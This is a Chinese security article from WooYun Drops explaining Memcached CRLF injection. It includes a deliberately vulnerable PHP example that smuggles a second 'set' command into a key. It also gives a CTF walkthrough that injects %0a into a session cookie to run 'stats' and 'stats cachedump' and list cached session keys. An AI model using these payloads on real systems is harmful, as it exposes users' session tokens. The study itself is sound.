@@ -1,0 +1,115 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">被人遗忘的Memcached内存注射</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">小飞</a> <span class="bull">·</span> <time title="2015/09/24 10:30" ui-time="" datetime="2015/09/24 10:30" class="published ng-binding ng-isolate-scope">2015/09/24 10:30</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 写在前面</h1><hr><p>wooyun主站也有过Memcached相关漏洞，但大多都是未授权访问，其实即使是部署得当的Memcached，如果碰上安全意识差的程序员哥哥，那么同样会出现Memcached安全风险，导致敏感内存泄露。</p><p>也就是本文要说的Memcached注入</p><h1>0x01 Memcached简介&amp;安全性分析</h1><hr><p>Memcached 是一个高性能的分布式内存对象缓存系统，用于动态Web应用以减轻数据库负载。</p><p>它通过在内存中缓存数据和对象来减少读取数据库的次数，从而提高动态、数据库驱动网站的速度。</p><p>用白话就是说，当传统web将访问产生的临时数据存储在后端数据库（如user sessions），部署了Memcached的应用会将user sessions以及其他一些敏感信息存储在RAM中，增速同时也减轻后端数据库反复查询带来的负载。</p><p>Memcached创建者Dormando很早就写过两篇文章，告诫开发人员不要用memcached存储Session。但是很多开发者为了性能或者其他原因，依旧把session存储在memcached中。这样做，一旦memcached被攻击，直接将导致管理员或者是用户token泄露。</p><h1>0x02 Memcached协议</h1><hr><p>当Memcache被部署之后，我们该如何向其中添加数据？我们通过一个cheat sheet了解一下Memcached的协议。</p><p>Memcached的语法由如下元素组成</p><p>{COMMAND}0x20{ARGUMENT}(LF|CRLF)</p><p>command字段有如下几条命令</p><ol><li>存储操作(set, add, replace, append, prepend, cas)</li><li>检索操作 (get, gets)</li><li>删除操作 (delete)</li><li>增减操作 (incr, decr)</li><li>touch</li><li>slabs reassign</li><li>slabs automove</li><li>lru_crawler</li><li>统计操作(stats items, slabs, cachedump)</li><li>其他操作 (version, flush_all, quit)</li></ol><p>下面给出几个安全测试中有用的命令</p><table border="1"><tr><td>Command</td><td>描述</td><td>实例</td></tr><tr><td>get</td><td>读某个值</td><td>get mykey</td></tr><tr><td>set</td><td>强制设置某个键值</td><td>set mykey 0 60 5</td></tr><tr><td>add</td><td>添加新键值对</td><td>add newkey 0 60 5</td></tr><tr><td>replace</td><td>覆盖已经存在的key</td><td>replace key 0 60 5</td></tr><tr><td>flush_all</td><td>让所有条目失效</td><td>flush_all</td></tr><tr><td>stats</td><td>打印当前状态</td><td>stats</td></tr><tr><td>stats malloc</td><td>打印内存状态</td><td>stats malloc</td></tr><tr><td>version</td><td>打印Memcached版本</td><td>version</td></tr></table><p><strong>stats cachedump 读取内存中存储的条目</strong></p><h1>0x03 Memcached代码实现</h1><hr><p>部署好Memcached之后，一个调用Memcached的php代码是这样的。</p><pre><code>#!php
+&lt;?php    
+
+$m = new Memcached();     
+
+$m-&gt;set("prefix_".$_GET[‘key’],"data");
+</code></pre><p>为了体现漏洞的产生，我想这样写</p><pre><code>#!php
+&lt;?php    
+
+$m = new Memcached();    
+
+$m-&gt;addServer('localhost', 11211);    
+
+$m-&gt;set("key1 0 0 1\r\n1\r\nset injected 0 3600 10\r\n1234567890\r\n","1234567890",30);    
+
+?&gt;
+</code></pre><p><code>set("key1 0 0 1\r\n1\r\nset injected 0 3600 10\r\n1234567890\r\n","1234567890",30)</code></p><p>是的，这里也就能看到问题。</p><p>执行刚刚的命令的时候，server和client的通信是这样的（>表示发送到Memcached ，&lt;表示从Memcached的返回）</p><pre><code>&gt; set key 0 0 1
+&gt; 1
+&lt; STORED
+
+&gt; set injected 0 3600 10
+&gt; 1234567890
+&lt; STORED
+
+&gt; 0 30 10
+&lt; ERROR
+
+&gt; 1234567890
+&lt; ERROR
+</code></pre><p>可以看到，对Memcached的协议来讲，\r\n是可以用来分割命令的，所以说，我们能直接通过CLRF注入，将\r\n注入到将要传入Memcached的元素中（例如cookies），实现命令执行。</p><h1>0x04 Memcache Injection实例</h1><hr><p>最近的一次ctf中，有一个典型的基于CLRF的Memcache注入。（目前该站可以访问）</p><p><code>http://login2.chal.mmactf.link/login</code></p><p>login as admin</p><p>登录之后的请求是这样的</p><pre><code>GET / HTTP/1.1
+Host: login2.chal.mmactf.link
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/   20100101 Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://login2.chal.mmactf.link/login
+Cookie: ss=c4a613cdf3378b458be9a6d8de6c52c6ab260d1ee5c2d94df6fe260e580b16bb
+Connection: keep-alive
+</code></pre><p>在测试http头注入的时候，我们发现将%0a注入到cookies中时,也就是请求：</p><p><code>Cookie: ss=%0ac4a613cdf3378b458be9a6d8de6c52c6ab260d1ee5c2d94df6fe260e580b16bb</code></p><p>返回如下</p><pre><code>&lt;/div&gt;
+&lt;div id="info"&gt;
+&lt;p&gt;MemcacheError:ERROR  
+ERROR&lt;/p&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>恩，memcached出错了，那不就是刚刚提到的error吗？</p><pre><code>&gt; 1234567890
+&lt; ERROR
+</code></pre><p>说明这里ss的value代入了memcached。</p><p>我们继续在cookies里面注入:ss=%0astats</p><pre><code>MemcacheError:ERROR
+STAT pid 988
+STAT uptime 651664
+STAT time 1442726665
+STAT version 1.4.14 (Ubuntu)
+STAT libevent 2.0.21-stable
+STAT pointer_size 64
+STAT rusage_user 17.256000
+STAT rusage_system 18.232000
+STAT curr_connections 5
+STAT total_connections 946
+STAT connection_structures 6
+STAT reserved_fds 20
+STAT cmd_get 615
+STAT cmd_set 188
+STAT cmd_flush 0
+STAT cmd_touch 0
+STAT get_hits 299
+STAT get_misses 316
+STAT delete_misses 0
+STAT delete_hits 42
+STAT incr_misses 0
+STAT incr_hits 0
+STAT decr_misses 0
+STAT decr_hits 0
+STAT cas_misses 0
+STAT cas_hits 0
+STAT cas_badval 0
+STAT touch_hits 0
+STAT touch_misses 0
+STAT auth_cmds 0
+STAT auth_errors 0
+STAT bytes_read 54350
+STAT bytes_written 86307
+STAT limit_maxbytes 67108864
+STAT accepting_conns 1
+STAT listen_disabled_num 0
+STAT threads 4
+STAT conn_yields 0
+STAT hash_power_level 16
+STAT hash_bytes 524288
+STAT hash_is_expanding 0
+STAT expired_unfetched 15
+STAT evicted_unfetched 0
+STAT bytes 1137
+STAT curr_items 8
+STAT total_items 153
+STAT evictions 0
+STAT reclaimed 96
+END
+</code></pre><p>果然返回了memcached的stats</p><p>现在来做我们最想做的一件事情，dump内存中的东西看看：我们利用cachedump</p><p><code>stats cachedump {slab class} {number of items to dump}</code></p><p>这里需要介绍下 memcached是以slab class进行分类的 比如：</p><pre><code>$ memcached -vv
+slab class   1: chunk size        96 perslab   10922
+slab class   2: chunk size       120 perslab    8738
+slab class   3: chunk size       152 perslab    6898
+slab class   4: chunk size       192 perslab    5461
+</code></pre><p>我们可以看到每个class的编排</p><p>所以我们每一个都dump出来看看才好：</p><p><code>Cookie: %0astats cachedump 1 1000</code></p><p>返回为</p><p><code>MemcacheError:ERROR ITEM key [1 b; 1441762228 s] ITEM 12345 [20 b; 1441494967 s] END</code></p><p>当我遍历到class 3的时候：</p><pre><code>Cookie: %0astats cachedump 3 1000    
+MemcacheError:ERROR 
+ITEM 3f063d8659f0f08c4454554294aca59bbe42cc6e11db23eb69f5a1c0a9486aa1 [19 b; 1442016274 s] 
+ITEM 0e9d0aecea498b15ee63d38dd4664dcfc75be0846ec4baee931b45a04462eeab [20 b; 1441494967 s] 
+ITEM 09cf27be606344f29bda74bd7c035e6d862c95025a2a6bb1785c8883ae65b18a [16 b; 1441494967 s] 
+ITEM b33542ed3c8bf5c2c346e26aac28a10055fa6a50c4948873810798e9f4cfca98 [20 b; 1441494967 s] 
+ITEM e391306f6481940ab3c796eb1253435b06e9a9357227de734b0ec3f58bd14d7f [19 b; 1442011213 s] 
+ITEM c706b288065ad5c29153d8773c3e3be6e8a07408cdf4e0e40e97917896e43839 [19 b; 1442012877 s] 
+ITEM a5e754e6e804bf7e49f8096242a6566cc337b06aa6c2dafda3f86edccf8cb4b3 [19 b; 1442011191 s] 
+ITEM edf938c33d05ff9f8696415d5ef817014a5cc2906abe24576fdafe8ae58dde48 [19 b; 1442010879 s] 
+ITEM 5f7d07e310e9fad574d0975741a9c05d0d75d7157ce9bb9546b7f58d940cee7a [19 b; 1442006048 s] 
+ITEM 3d1a32800a501fe7387287ba4631ae9318206ef96083a29f35fd1ef42f7a85c5 [19 b; 1441998916 s] 
+</code></pre><p>终于注入到我们所需要的class中去。</p><h1>0x05 参考</h1><hr><p><strong>Memcache cheat sheet</strong>: <a href="http://lzone.de/cheat-sheet/memcached">http://lzone.de/cheat-sheet/memcached</a></p><p><strong>Memcached Injection</strong>: <a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/865" rel="bookmark" id="re1">Memcache安全配置</a></li><li><a href="http://drops.wooyun.org/papers/66" rel="bookmark" id="re2">Python Pickle反序列化带来的安全问题</a></li><li><a href="http://drops.wooyun.org/web/8528" rel="bookmark" id="re3">从django的SECRET_KEY到代码执行</a></li><li><a href="http://drops.wooyun.org/tips/2834" rel="bookmark" id="re4">HttpOnly 隐私嗅探器</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">齐迹</span> <span class="reply-time">2015-10-30 10:29:12</span></div><p></p><p>这个难道不是mc的bug吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">只发通用型</span> <span class="reply-time">2015-09-25 12:11:39</span></div><p></p><p>php中Memcached存在注入,Memcache过滤了\r\n.<br>python的pylibmc存在注入,memcache不存在注入。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">D＆G</span> <span class="reply-time">2015-09-24 18:55:30</span></div><p></p><p>http://login2.chal.mmactf.link/login<br>这个咋登陆</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">D＆G</span> <span class="reply-time">2015-09-24 18:17:48</span></div><p></p><p>6666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2015-09-24 14:31:19</span></div><p></p><p>666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">phith0n</span> <span class="reply-time">2015-09-24 12:52:40</span></div><p></p><p>这个我要收藏一哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2015-09-24 11:27:18</span></div><p></p><p>赞！</p><p></p></div></div></div></div></div></main>
